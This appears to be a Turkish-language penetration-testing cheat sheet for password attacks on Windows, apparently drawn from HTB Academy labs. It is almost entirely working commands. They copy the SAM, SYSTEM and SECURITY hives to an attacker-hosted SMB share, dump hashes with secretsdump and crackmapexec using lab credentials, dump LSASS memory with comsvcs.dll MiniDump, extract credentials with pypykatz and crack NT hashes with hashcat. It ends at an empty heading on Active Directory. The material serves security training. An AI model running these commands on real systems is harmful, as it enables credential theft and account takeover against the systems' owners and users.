---
{"dg-publish":true,"permalink":"/cheat-sheet/password-attacks-cheat-sheet/"}
---



#### 1-**Registry Hives Kopyalamak için reg.exe save dosyasını kullanma**  

```cmd-session
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save


C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save


C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

```

##### 1- Attack Host SMB server oluşturma
```shell-session
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

##### 2- Attack Host Paylaşımına Hives'leri taşıma
```cmd-session
move sam.save \\10.10.15.16\CompData
```

```cmd-session
move security.save \\10.10.15.16\CompData
```

```cmd-session
move system.save \\10.10.15.16\CompData
```



##### 3-**Impacket'in secretsdump.py ile Hash'leri Dump Etme**

```shell-session
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```


##### 4- **Hashcat'i NT Hash'lerine karşı çalıştırma**

```shell-session
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```



#### 2-**Dumping LSA Secrets Remotely**
```shell-session
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```


#### 3-Dumping SAM Remotely
```shell-session
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```



#### 4- **LSASS Process Belleğini Dump Etme**  

##### 1-Task Manager Method
![Pasted image 20241103020941.png](/img/user/resimler/Pasted%20image%2020241103020941.png)

###### Dump yeri 
```cmd-session
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```


##### 2-Rundll32.exe & Comsvcs.dll Method

###### Finding LSASS PID in cmd

```cmd-session
C:\Windows\system32> tasklist /svc
```

###### Finding LSASS PID in PowerShell
```powershell-session
Get-Process lsass
```


###### PowerShell kullanarak lsass.dmp oluşturma
```powershell-session
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```



#### 5-**Kimlik Bilgilerini Çıkarmak için Pypykatz Kullanma**

```shell-session
pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
```


#### 6- **Hashcat ile NT Hash'ini Kırma**

```shell-session
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```



## Attacking Active Directory & NTDS.dit
